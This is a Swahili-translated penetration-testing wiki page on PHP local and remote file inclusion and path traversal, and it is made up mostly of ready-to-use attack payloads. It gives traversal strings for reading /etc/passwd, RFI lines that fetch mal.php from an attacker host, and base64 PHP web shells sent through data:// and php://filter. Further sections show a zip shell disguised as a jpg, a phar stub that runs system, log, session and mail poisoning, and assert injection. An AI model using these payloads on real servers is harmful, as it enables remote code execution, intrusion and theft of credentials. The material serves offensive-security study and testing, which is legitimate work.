# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Faili linawekwa kutoka kwa seva ya mbali (Bora: Unaweza kuandika msimbo na seva itatekeleza). Katika php hii ni **imezuiliwa** kwa default (**allow_url_include**).\
**Local File Inclusion (LFI):** Seva inaweka faili ya ndani.

Uthibitisho wa udhaifu hutokea wakati mtumiaji anaweza kudhibiti kwa njia fulani faili ambayo itakuwa ikipakiwa na seva.

**PHP functions** zenye udhaifu: require, require_once, include, include_once

Zana ya kuvutia kutumia kutekeleza udhaifu huu: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Kuchanganya orodha kadhaa za \*nix LFI na kuongeza njia zaidi nimeunda hii:**

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Jaribu pia kubadilisha `/` kwa `\`\
Jaribu pia kuongeza `../../../../../`

Orodha inayotumia mbinu kadhaa kupata faili /etc/password (kuangalia kama udhaifu upo) inaweza kupatikana [hapa](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Mchanganyiko wa orodha tofauti za maneno:

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Jaribu pia kubadilisha `/` kwa `\`\
Jaribu pia kuondoa `C:/` na kuongeza `../../../../../`

Orodha inayotumia mbinu kadhaa kupata faili /boot.ini (kuangalia kama udhaifu upo) inaweza kupatikana [hapa](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Angalia orodha ya LFI ya linux.

## Msingi wa LFI na bypasses

Mifano yote ni kwa ajili ya Local File Inclusion lakini inaweza kutumika pia kwa Remote File Inclusion (ukurasa=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### mfuatano wa kusafiri umeondolewa bila kurudi nyuma
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Pita kuongeza herufi zaidi mwishoni mwa mfuatano uliopewa (pita ya: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Hii ime **suluhishwa tangu PHP 5.4**

### **Uandishi**

Unaweza kutumia uandishi usio wa kawaida kama vile kuandika URL mara mbili (na mengineyo):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Kutoka kwa folda iliyopo

Labda back-end inakagua njia ya folda:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Kuchunguza Maktaba za Mfumo wa Faili kwenye Seva

Mfumo wa faili wa seva unaweza kuchunguzwa kwa njia ya kurudi ili kubaini maktaba, si faili tu, kwa kutumia mbinu fulani. Mchakato huu unahusisha kubaini kina cha maktaba na kuchunguza uwepo wa folda maalum. Hapa kuna njia ya kina ya kufanikisha hili:

1. **Baini Kina cha Maktaba:** Thibitisha kina cha maktaba yako ya sasa kwa kufanikiwa kupata faili ya `/etc/passwd` (inatumika ikiwa seva ni ya Linux). Mfano wa URL unaweza kuundwa kama ifuatavyo, ukionyesha kina cha tatu:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Chunguza kwa Folda:** Ongeza jina la folda inayoshukiwa (kwa mfano, `private`) kwenye URL, kisha rudi kwenye `/etc/passwd`. Kiwango cha ziada cha saraka kinahitaji kuongeza kina kwa moja:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpret the Outcomes:** Jibu la seva linaonyesha kama folda ipo:
- **Error / No Output:** Folda `private` huenda haipo katika eneo lililotajwa.
- **Contents of `/etc/passwd`:** Uwepo wa folda `private` umethibitishwa.
4. **Recursive Exploration:** Folda zilizogunduliwa zinaweza kuchunguzwa zaidi kwa subdirectories au faili kwa kutumia mbinu ile ile au mbinu za jadi za Local File Inclusion (LFI).

Ili kuchunguza directories katika maeneo tofauti katika mfumo wa faili, badilisha payload ipasavyo. Kwa mfano, ili kuangalia kama `/var/www/` ina folda `private` (kikadiria kuwa folda ya sasa iko katika kina cha 3), tumia:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Tekniki ya Kukata Njia**

Kukata njia ni mbinu inayotumika kubadilisha njia za faili katika programu za wavuti. Mara nyingi inatumika kufikia faili zilizozuiliwa kwa kupita baadhi ya hatua za usalama ambazo zinaongeza wahusika wa ziada mwishoni mwa njia za faili. Lengo ni kuunda njia ya faili ambayo, mara itakapobadilishwa na hatua ya usalama, bado inaelekeza kwenye faili inayotakiwa.

Katika PHP, uwakilishi mbalimbali wa njia ya faili unaweza kuzingatiwa kuwa sawa kutokana na asili ya mfumo wa faili. Kwa mfano:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, na `/etc/passwd/` zote zinachukuliwa kama njia moja.
- Wakati wahusika 6 wa mwisho ni `passwd`, kuongeza `/` (kuifanya kuwa `passwd/`) hakubadilishi faili inayolengwa.
- Vivyo hivyo, ikiwa `.php` imeongezwa kwenye njia ya faili (kama `shellcode.php`), kuongeza `/.` mwishoni hakutabadilisha faili inayofikiwa.

Mifano iliyotolewa inaonyesha jinsi ya kutumia kukata njia kufikia `/etc/passwd`, lengo la kawaida kutokana na maudhui yake nyeti (taarifa za akaunti za mtumiaji):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Katika hali hizi, idadi ya traversals inayohitajika inaweza kuwa karibu 2027, lakini nambari hii inaweza kubadilika kulingana na usanidi wa seva.

- **Kutumia Sehemu za Dot na Wahusika Wengine**: Mfuatano wa traversal (`../`) uliochanganywa na sehemu za dot za ziada na wahusika unaweza kutumika kuhamasisha mfumo wa faili, kwa ufanisi ukipuuza nyongeza za mfuatano na seva.
- **Kujua Idadi Inayohitajika ya Traversals**: Kupitia majaribio na makosa, mtu anaweza kupata idadi sahihi ya mfuatano wa `../` inayohitajika kuhamasisha hadi kwenye saraka ya mzizi na kisha hadi `/etc/passwd`, kuhakikisha kwamba nyongeza zozote (kama `.php`) zimeondolewa lakini njia inayotakiwa (`/etc/passwd`) inabaki kama ilivyo.
- **Kuanza na Saraka ya Uongo**: Ni kawaida kuanza njia na saraka isiyo na uwepo (kama `a/`). Mbinu hii inatumika kama hatua ya tahadhari au kutimiza mahitaji ya mantiki ya uchambuzi wa njia ya seva.

Wakati wa kutumia mbinu za kupunguza njia, ni muhimu kuelewa tabia ya uchambuzi wa njia ya seva na muundo wa mfumo wa faili. Kila hali inaweza kuhitaji mbinu tofauti, na majaribio mara nyingi yanahitajika ili kupata mbinu bora zaidi.

**Ukatishaji huu ulirekebishwa katika PHP 5.3.**

### **Hila za kupita vichungi**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Katika php hii imezimwa kwa default kwa sababu **`allow_url_include`** ni **Off.** Inapaswa kuwa **On** ili ifanye kazi, na katika kesi hiyo unaweza kujumuisha faili ya PHP kutoka kwa seva yako na kupata RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ikiwa kwa sababu fulani **`allow_url_include`** iko **On**, lakini PHP inachuja ufikiaji wa kurasa za wavuti za nje, [kulingana na chapisho hili](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), unaweza kutumia kwa mfano protokali ya data na base64 kufungua msimbo wa PHP wa b64 na kupata RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!NOTE]
> Katika msimbo uliopita, `+.txt` ya mwisho iliongezwa kwa sababu mshambuliaji alihitaji mfuatano ulio na mwisho `.txt`, hivyo mfuatano huo unamalizika nayo na baada ya kufungua b64 sehemu hiyo itarudisha tu takataka na msimbo halisi wa PHP utaingizwa (na hivyo, kutekelezwa).

Mfano mwingine **usio tumia itifaki ya `php://`** ungekuwa:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root element

Katika python katika msimbo kama huu:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ikiwa mtumiaji atatoa **njia kamili** kwa **`file_name`**, **njia ya awali itondolewa tu**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Ni tabia iliyokusudiwa kulingana na [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ikiwa kipengele ni njia kamili, vipengele vyote vya awali vinatupwa mbali na kuunganishwa kunaendelea kutoka kwa kipengele cha njia kamili.

## Java Orodha ya Maktaba

Inaonekana kama una Path Traversal katika Java na **unaomba maktaba** badala ya faili, **orodha ya maktaba inarudishwa**. Hii haitatokea katika lugha nyingine (kama ninavyofahamu).

## Vigezo 25 Bora

Hapa kuna orodha ya vigezo 25 bora ambavyo vinaweza kuwa na udhaifu wa kuingiza faili za ndani (LFI) (kutoka [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI kutumia PHP wrappers & protocols

### php://filter

PHP filters huruhusu kufanya **operesheni za mabadiliko kwenye data** kabla ya kusomwa au kuandikwa. Kuna makundi 5 ya filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Ondoa lebo kutoka kwa data (kila kitu kati ya herufi "<" na ">")
- Kumbuka kwamba filter hii imeondoka katika toleo za kisasa za PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Hubadilisha kuwa encoding tofauti (`convert.iconv.<input_enc>.<output_enc>`). Ili kupata **orodha ya encodings zote** zinazoungwa mkono, endesha kwenye console: `iconv -l`

> [!WARNING]
> Kutumia vibaya `convert.iconv.*` conversion filter unaweza **kuunda maandiko yasiyo na mipaka**, ambayo yanaweza kuwa na manufaa kuandika maandiko yasiyo na mipaka au kufanya kazi kama kuingiza mchakato maandiko yasiyo na mipaka. Kwa maelezo zaidi angalia [**LFI2RCE kupitia php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Punguza maudhui (yanafaa ikiwa unatoa taarifa nyingi)
- `zlib.inflate`: Rejesha data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Imepitwa na wakati
- `mdecrypt.*` : Imepitwa na wakati
- Filters Nyingine
- Ukikimbia php `var_dump(stream_get_filters());` unaweza kupata couple ya **filters zisizotarajiwa**:
- `consumed`
- `dechunk`: inarudisha encoding ya HTTP chunked
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Sehemu "php://filter" haina tofauti kati ya herufi kubwa na ndogo

### Kutumia filters za php kama oracle kusoma faili zisizo za kawaida

[**Katika chapisho hili**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) inapendekezwa mbinu ya kusoma faili ya ndani bila kupata matokeo kutoka kwa seva. Mbinu hii inategemea **kuhamasisha boolean ya faili (karakteri kwa karakteri) kwa kutumia filters za php** kama oracle. Hii ni kwa sababu filters za php zinaweza kutumika kufanya maandiko kuwa makubwa vya kutosha ili php itupe kosa.

Katika chapisho la asili unaweza kupata maelezo ya kina kuhusu mbinu hii, lakini hapa kuna muhtasari wa haraka:

- Tumia codec **`UCS-4LE`** kuacha herufi inayoongoza ya maandiko mwanzoni na kufanya ukubwa wa mfuatano kuongezeka kwa kasi.
- Hii itatumika kuzalisha **maandishi makubwa sana wakati herufi ya mwanzo inakisiwa kwa usahihi** kwamba php itasababisha **kosa**
- Filter ya **dechunk** it **ondoa kila kitu ikiwa herufi ya kwanza si hexadecimal**, hivyo tunaweza kujua ikiwa herufi ya kwanza ni hex.
- Hii, ikichanganywa na ile ya awali (na filters nyingine kulingana na herufi iliyokisiwa), itaturuhusu kukisia herufi mwanzoni mwa maandiko kwa kuona wakati tunafanya mabadiliko ya kutosha ili kufanya isiwe herufi ya hexadecimal. Kwa sababu ikiwa ni hex, dechunk haitaiondoa na bomu la awali litafanya php ipate kosa.
- Codec **convert.iconv.UNICODE.CP930** inabadilisha kila herufi kuwa ifuatayo (hivyo baada ya codec hii: a -> b). Hii inaturuhusu kugundua ikiwa herufi ya kwanza ni `a` kwa mfano kwa sababu ikiwa tutatumia 6 za codec hii a->b->c->d->e->f->g herufi haitakuwa tena herufi ya hexadecimal, kwa hivyo dechunk haikuondoa na kosa la php linachochewa kwa sababu linazidisha na bomu la awali.
- Kutumia mabadiliko mengine kama **rot13** mwanzoni inawezekana kuvuja herufi nyingine kama n, o, p, q, r (na codecs nyingine zinaweza kutumika kuhamasisha herufi nyingine kwenye eneo la hex).
- Wakati herufi ya mwanzo ni nambari inahitajika kuibua kwa base64 na kuvuja herufi 2 za kwanza ili kuvuja nambari.
- Tatizo la mwisho ni kuona **jinsi ya kuvuja zaidi ya herufi ya mwanzo**. Kwa kutumia filters za kumbukumbu za agizo kama **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** inawezekana kubadilisha agizo la herufi na kupata katika nafasi ya kwanza herufi nyingine za maandiko.
- Na ili kuwa na uwezo wa kupata **data zaidi** wazo ni **kuunda bytes 2 za data za takataka mwanzoni** kwa kutumia **convert.iconv.UTF16.UTF16**, tumia **UCS-4LE** ili kufanya iwe **pivot na bytes 2 zinazofuata**, na **ondoa data hadi takataka** (hii itafuta bytes 2 za kwanza za maandiko ya awali). Endelea kufanya hivi hadi ufikie kipande kinachotakiwa kuvuja.

Katika chapisho zana ya kufanya hii kiotomatiki pia ilivuja: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Wrapper hii inaruhusu kufikia waandishi wa faili ambao mchakato umefungua. Inaweza kuwa na manufaa kuhamasisha maudhui ya faili zilizofunguliwa:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Unaweza pia kutumia **php://stdin, php://stdout na php://stderr** kufikia **file descriptors 0, 1 na 2** mtawalia (sijui jinsi hii inaweza kuwa na manufaa katika shambulio)

### zip:// na rar://

Pakia faili la Zip au Rar lenye PHPShell ndani na ulifike.\
Ili uweze kutumia protokali ya rar **inahitaji kuamuliwa kwa njia maalum**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Kumbuka kwamba protokali hii imepunguziliwa mbali na mipangilio ya php **`allow_url_open`** na **`allow_url_include`**

### expect://

Expect inapaswa kuanzishwa. Unaweza kutekeleza msimbo kwa kutumia hii:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Taja payload yako katika vigezo vya POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Faili la `.phar` linaweza kutumika kutekeleza msimbo wa PHP wakati programu ya wavuti inatumia kazi kama `include` kwa ajili ya kupakia faili. Kipande cha msimbo wa PHP kilichotolewa hapa chini kinaonyesha jinsi ya kuunda faili la `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Ili kukusanya faili ya `.phar`, amri ifuatayo inapaswa kutekelezwa:
```bash
php --define phar.readonly=0 create_path.php
```
Kwa utekelezaji, faili lililoitwa `test.phar` litaundwa, ambalo linaweza kutumika ku exploit Local File Inclusion (LFI) vulnerabilities.

Katika hali ambapo LFI inafanya tu kusoma faili bila kutekeleza PHP code ndani yake, kupitia kazi kama `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, au `filesize()`, ku exploit udhaifu wa deserialization kunaweza kujaribiwa. Udhaifu huu unahusishwa na kusoma faili kwa kutumia protokali ya `phar`.

Kwa ufahamu wa kina wa ku exploit udhaifu wa deserialization katika muktadha wa faili za `.phar`, rejelea hati iliyo na kiungo hapa chini:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ilikuwa inawezekana kutumia **faili yoyote isiyo ya kawaida iliyosomwa kutoka PHP inayounga mkono filters za php** kupata RCE. Maelezo ya kina yanaweza [**kupatikana katika chapisho hili**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Muhtasari wa haraka: **overflow ya byte 3** katika PHP heap ilitumiwa vibaya ili **kubadilisha mchain ya chunks za bure** za ukubwa maalum ili kuweza **kuandika chochote katika anwani yoyote**, hivyo hook iliongezwa kuita **`system`**.\
Ilikuwa inawezekana kugawa chunks za ukubwa maalum kwa kutumia filters zaidi za php.

### Protokali zaidi

Angalia protokali zaidi zinazowezekana [**kujumuisha hapa**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Andika katika kumbukumbu au katika faili ya muda (sijui jinsi hii inaweza kuwa na manufaa katika shambulio la kuingiza faili)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Kufikia mfumo wa faili wa ndani
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Kufikia URL za HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Kufikia URL za FTP(s)
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Pata majina ya njia yanayolingana na muundo (Hairejeshi chochote kinachoweza kuchapishwa, hivyo si kweli yenye manufaa hapa)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Mipangilio ya sauti (Siyo yenye manufaa kusoma faili zisizo za kawaida)

## LFI kupitia 'assert' ya PHP

Hatari za Local File Inclusion (LFI) katika PHP ni za juu sana wakati wa kushughulikia kazi ya 'assert', ambayo inaweza kutekeleza code ndani ya nyuzi. Hii ni tatizo hasa ikiwa ingizo linalojumuisha wahusika wa kupita kwenye saraka kama ".." linakaguliwa lakini halijasafishwa ipasavyo.

Kwa mfano, code ya PHP inaweza kuundwa kuzuia kupita kwenye saraka kama ifuatavyo:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Wakati hii inakusudia kuzuia traversal, inasababisha bila kukusudia kuunda njia ya kuingiza msimbo. Ili kutumia hii kusoma maudhui ya faili, mshambuliaji anaweza kutumia:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Vivyo hivyo, kwa kutekeleza amri za mfumo zisizo na mpangilio, mtu anaweza kutumia:
```plaintext
' and die(system("id")) or '
```
Ni muhimu **kuandika URL hizi payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Mbinu hii inahusiana katika hali ambapo unadhibiti **file path** ya **PHP function** ambayo itafanya **access a file** lakini huwezi kuona maudhui ya faili (kama wito rahisi kwa **`file()`**) lakini maudhui hayataonyeshwa.

Katika [**hiki kipande cha ajabu**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) inaelezwa jinsi traversal ya njia ya kipofu inaweza kutumika vibaya kupitia PHP filter ili **kuondoa maudhui ya faili kupitia oracle ya makosa**.

Kwa muhtasari, mbinu inatumia **"UCS-4LE" encoding** kufanya maudhui ya faili kuwa **makubwa** kiasi kwamba **PHP function inayofungua** faili itasababisha **makosa**.

Kisha, ili kuvuja herufi ya kwanza, filter **`dechunk`** inatumika pamoja na nyingine kama **base64** au **rot13** na hatimaye filters **convert.iconv.UCS-4.UCS-4LE** na **convert.iconv.UTF16.UTF-16BE** zinatumika ili **kweka herufi nyingine mwanzoni na kuvuja hizo**.

**Functions ambazo zinaweza kuwa na udhaifu**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (tu lengo kusoma tu na hii)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Kwa maelezo ya kiufundi angalia kipande kilichotajwa!

## LFI2RCE

### Remote File Inclusion

Imeelezwa hapo awali, [**fuata kiungo hiki**](#remote-file-inclusion).

### Kupitia faili za log za Apache/Nginx

Ikiwa seva ya Apache au Nginx ni **dhaifu kwa LFI** ndani ya kazi ya kujumuisha unaweza kujaribu kufikia **`/var/log/apache2/access.log` au `/var/log/nginx/access.log`**, kuweka ndani ya **user agent** au ndani ya **GET parameter** shell ya php kama **`<?php system($_GET['c']); ?>`** na kujumuisha faili hiyo.

> [!WARNING]
> Kumbuka kwamba **ikiwa unatumia nukuu mbili** kwa shell badala ya **nukuu rahisi**, nukuu mbili zitaondolewa kwa string "_**quote;**_", **PHP itatupa makosa** hapo na **hakuna kingine kitakachotekelezwa**.
>
> Pia, hakikisha unandika **sahihi payload** au PHP itakosea kila wakati inajaribu kupakia faili la log na hutakuwa na fursa ya pili.

Hii inaweza pia kufanywa katika log nyingine lakini **kuwa makini,** msimbo ndani ya log unaweza kuwa umeandikwa URL na hii inaweza kuharibu Shell. Kichwa **authorisation "basic"** kina "user:password" katika Base64 na kinatolewa ndani ya log. PHPShell inaweza kuingizwa ndani ya kichwa hiki.\
Njia nyingine zinazowezekana za log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Kupitia Barua Pepe

**Tuma barua pepe** kwa akaunti ya ndani (user@localhost) yenye payload yako ya PHP kama `<?php echo system($_REQUEST["cmd"]); ?>` na jaribu kuingiza kwenye barua pepe ya mtumiaji kwa njia kama **`/var/mail/<USERNAME>`** au **`/var/spool/mail/<USERNAME>`**

### Kupitia /proc/\*/fd/\*

1. Pakia shells nyingi (kwa mfano: 100)
2. Jumuisha [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), ambapo $PID = PID ya mchakato (inaweza kulazimishwa) na $FD ni file descriptor (inaweza kulazimishwa pia)

### Kupitia /proc/self/environ

Kama faili ya log, tuma payload katika User-Agent, itajitokeza ndani ya faili ya /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Ikiwa unaweza kupakia faili, ingiza tu payload ya shell ndani yake (e.g : `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Ili kuweka faili kuwa na uwezo wa kusomeka ni bora kuingiza katika metadata ya picha/doc/pdf

### Kupitia Upakuaji wa Faili ya Zip

Pakua faili ya ZIP inayojumuisha shell ya PHP iliyoshinikizwa na ufikie:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

Angalia kama tovuti inatumia PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Katika PHP, vikao hivi vinahifadhiwa katika _/var/lib/php5/sess\\_\[PHPSESSID]\_ faili
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Seti cookie kuwa `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Tumia LFI kujumuisha faili la kikao la PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Ikiwa ssh inafanya kazi angalia ni mtumiaji gani anatumika (/proc/self/status & /etc/passwd) na jaribu kufikia **\<HOME>/.ssh/id_rsa**

### **Via** **vsftpd** _**logs**_

Maktaba za seva ya FTP vsftpd ziko katika _**/var/log/vsftpd.log**_. Katika hali ambapo kuna udhaifu wa Local File Inclusion (LFI), na ufikiaji wa seva ya vsftpd iliyofichuliwa unapatikana, hatua zifuatazo zinaweza kuzingatiwa:

1. Ingiza payload ya PHP katika uwanja wa jina la mtumiaji wakati wa mchakato wa kuingia.
2. Baada ya kuingiza, tumia LFI kupata maktaba za seva kutoka _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Kama ilivyoonyeshwa katika [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) makala, PHP base64 filter inapuuzilia mbali Non-base64. Unaweza kutumia hiyo kupita ukaguzi wa kiendelezi cha faili: ikiwa unatoa base64 inayomalizika na ".php", itapuuzilia mbali "." na kuongezea "php" kwa base64. Hapa kuna mfano wa payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

Hii [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) inaelezea kwamba unaweza kutumia **php filters kuunda maudhui yasiyo na mipaka** kama matokeo. Hii kwa msingi inamaanisha kwamba unaweza **kuunda msimbo wa php yasiyo na mipaka** kwa ajili ya kuingiza **bila kuhitaji kuandika** kwenye faili.

{{#ref}}
lfi2rce-via-php-filters.md
